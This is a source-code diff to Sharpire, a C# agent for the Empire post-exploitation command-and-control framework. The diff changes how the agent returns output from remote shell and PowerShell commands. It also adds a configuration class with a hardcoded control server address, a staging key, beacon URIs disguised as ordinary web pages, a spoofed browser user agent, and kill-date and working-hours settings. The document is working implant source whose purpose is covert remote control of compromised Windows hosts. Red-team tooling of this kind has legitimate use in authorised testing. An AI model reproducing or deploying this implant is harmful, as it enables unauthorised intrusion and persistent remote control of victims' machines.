@@ -1,4 +1,8 @@
-﻿using System;
+﻿// Original Author: 0xbadjuju (https://github.com/0xbadjuju/Sharpire)
+// Updated and Modified by: Jake Krasnov (@_Hubbl3)
+// Project: Empire (https://github.com/BC-SECURITY/Empire)
+
+using System;
 using System.Collections.Generic;
 using System.Collections.ObjectModel;
 using System.IO;
@@ -11,6 +15,7 @@ using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Text;
 using System.Threading;
+using System.Text.RegularExpressions;
 
 namespace Sharpire
 {
@@ -21,7 +26,7 @@ namespace Sharpire
 
         private byte[] packets;
         
-        private SessionInfo sessionInfo;
+        public SessionInfo sessionInfo;
         private Coms coms;
         private JobTracking jobTracking;
 
@@ -214,7 +219,7 @@ namespace Sharpire
         ////////////////////////////////////////////////////////////////////////////////
         internal static string InvokeShellCommand(string command, string arguments)
         {
-            if (arguments.Contains("*\"\\\\*")) 
+            if (arguments.Contains("*\"\\\\*"))
             {
                 arguments = arguments.Replace("\"\\\\","FileSystem::\"\\\\");
             }
@@ -223,6 +228,7 @@ namespace Sharpire
                 arguments = arguments.Replace("\\\\", "FileSystem::\\");
             }
             string output = "";
+            //This is mostly dead code consider removing in the future
             if (command.ToLower() == "shell")
             {
                 if (command.Length > 0)
@@ -233,7 +239,7 @@ namespace Sharpire
                 {
                     output = "no shell command supplied";
                 }
-                output += "\n\r..Command execution completed.";
+                output += "\n\r";
             }
             else
             {
@@ -297,8 +303,7 @@ namespace Sharpire
                 }
                 else
                 {
-                    RunPowerShell(arguments);
-                    output = "executed " + command + " " + arguments + "\n\r";
+                    output = RunPowerShell(command + " " + arguments);
                 }
             }
             return output;
@@ -648,5 +653,163 @@ namespace Sharpire
                 }
             }
         }
+    }
+    
+    sealed class SessionInfo
+    {
+        private string[] ControlServers;
+        private readonly string StagingKey;
+        private byte[] StagingKeyBytes;
+        private readonly string AgentLanguage;
+
+        private string[] TaskURIs;
+        private string UserAgent;
+        private double DefaultJitter;
+        private uint DefaultDelay;
+        private uint DefaultLostLimit;
+
+        private string StagerUserAgent;
+        private string StagerURI;
+        private string Proxy;
+        private string ProxyCreds;
+        private DateTime KillDate;
+        private DateTime WorkingHoursStart;
+        private DateTime WorkingHoursEnd;
+        private string AgentID;
+        private string SessionKey;
+        private byte[] SessionKeyBytes;
+
+        public SessionInfo()
+        {
+            //These settings will be the overwritten inputs for compilation 
+            ControlServers = new String[] { "http://192.168.219.128" };
+            StagingKey = "a#)JF=z_K%7S.1,-Ou{w+j9M&bcmflI4";
+            AgentLanguage = "dotnet";
+
+            SetDefaults();
+        }
+
+        public SessionInfo(string[] args)
+        {
+            ControlServers = args[0].Split(new String[] { "," }, StringSplitOptions.RemoveEmptyEntries);
+            Console.WriteLine(args[1]);
+            StagingKey = args[1];
+            AgentLanguage = args[2];
+
+            SetDefaults();
+        }
+
+        private void SetDefaults()
+        {
+            StagingKeyBytes = System.Text.Encoding.ASCII.GetBytes(StagingKey);
+            TaskURIs = new string[] { "/admin/get.php","/news.php","/login/process.php" };
+            UserAgent = "(Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
+            double DefaultJitter = 0.0;
+            uint DefaultDelay = 5;
+            uint DefaultLostLimit = 60;
+
+            StagerUserAgent = "";
+            if (string.IsNullOrEmpty(StagerUserAgent))
+            {
+                StagerUserAgent = UserAgent;
+            }
+            StagerURI = "";
+            Proxy = "default";
+            ProxyCreds = "";
+
+            string KillDate = "";
+            if (!string.IsNullOrEmpty(KillDate))
+            {
+                Regex regex = new Regex("^\\d{1,2}\\/\\d{1,2}\\/\\d{4}$");
+
+                if (regex.Match(KillDate).Success)
+                    DateTime.TryParse(KillDate, out this.KillDate);
+            }
+
+            string WorkingHours = "";
+            if (!string.IsNullOrEmpty(WorkingHours))
+            {
+                Regex regex = new Regex("^[0-9]{1,2}:[0-5][0-9]$");
+
+                string start = WorkingHours.Split(',').First();
+                if (regex.Match(start).Success)
+                    DateTime.TryParse(start, out WorkingHoursStart);
+
+                string end = WorkingHours.Split(',').Last();
+                if (regex.Match(end).Success)
+                    DateTime.TryParse(end, out WorkingHoursEnd);
+            }
+        }
+
+        public string[] GetControlServers() { return ControlServers; }
+        public string GetStagingKey() { return StagingKey; }
+        public byte[] GetStagingKeyBytes() { return StagingKeyBytes; }
+        public string GetAgentLanguage() { return AgentLanguage; }
+
+        public string[] GetTaskURIs() { return TaskURIs; }
+        public string GetUserAgent() { return UserAgent; }
+        public double GetDefaultJitter() { return DefaultJitter; }
+        public void SetDefaultJitter(double DefaultJitter)
+        {
+            this.DefaultJitter = DefaultJitter;
+        }
+        public uint GetDefaultDelay() { return DefaultDelay; }
+        public void SetDefaultDelay(uint DefaultDelay)
+        {
+            this.DefaultDelay = DefaultDelay;
+        }
+        public uint GetDefaultLostLimit() { return DefaultLostLimit; }
+        public void SetDefaultLostLimit(uint DefaultLostLimit)
+        {
+            this.DefaultLostLimit = DefaultLostLimit;
+        }
+
+        public string GetStagerUserAgent() { return StagerUserAgent; }
+        public string GetStagerURI() { return StagerURI; }
+        public string GetProxy() { return Proxy; }
+        public string GetProxyCreds() { return ProxyCreds; }
+        public DateTime GetKillDate() { return KillDate; }
+
+        public void setProfile(string profile)
+        {
+            this.TaskURIs = profile.Split('|').First().Split(',');
+            this.UserAgent = profile.Split('|').Last();
+        }
+        public void SetKillDate(string KillDate)
+        {
+            Regex regex = new Regex("^\\d{1,2}\\/\\d{1,2}\\/\\d{4}$");
+
+            if (regex.Match(KillDate).Success)
+                DateTime.TryParse(KillDate, out this.KillDate);
+        }
+        public void SetWorkingHoursStart(DateTime WorkingHoursStart)
+        {
+            this.WorkingHoursStart = WorkingHoursStart;
+        }
+        public void SetWorkingHours(string WorkingHours)
+        {
+            Regex regex = new Regex("^[0-9]{1,2}:[0-5][0-9]$");
+
+            string start = WorkingHours.Split('-').First();
+            if (regex.Match(start).Success)
+                DateTime.TryParse(start, out this.WorkingHoursStart);
+
+            string end = WorkingHours.Split('-').Last();
+            if (regex.Match(end).Success)
+                DateTime.TryParse(end, out this.WorkingHoursEnd);
+        }
+        public DateTime GetWorkingHoursStart() { return WorkingHoursStart; }
+        public DateTime GetWorkingHoursEnd() { return WorkingHoursEnd; }
+
+        public void SetAgentID(string AgentID) { this.AgentID = AgentID; }
+        public string GetAgentID() { return AgentID; }
+
+        public void SetSessionKey(string SessionKey)
+        {
+            this.SessionKey = SessionKey;
+            SessionKeyBytes = System.Text.Encoding.ASCII.GetBytes(SessionKey);
+        }
+        public string GetSessionKey() { return SessionKey; }
+        public byte[] GetSessionKeyBytes() { return SessionKeyBytes; }
     }
 }
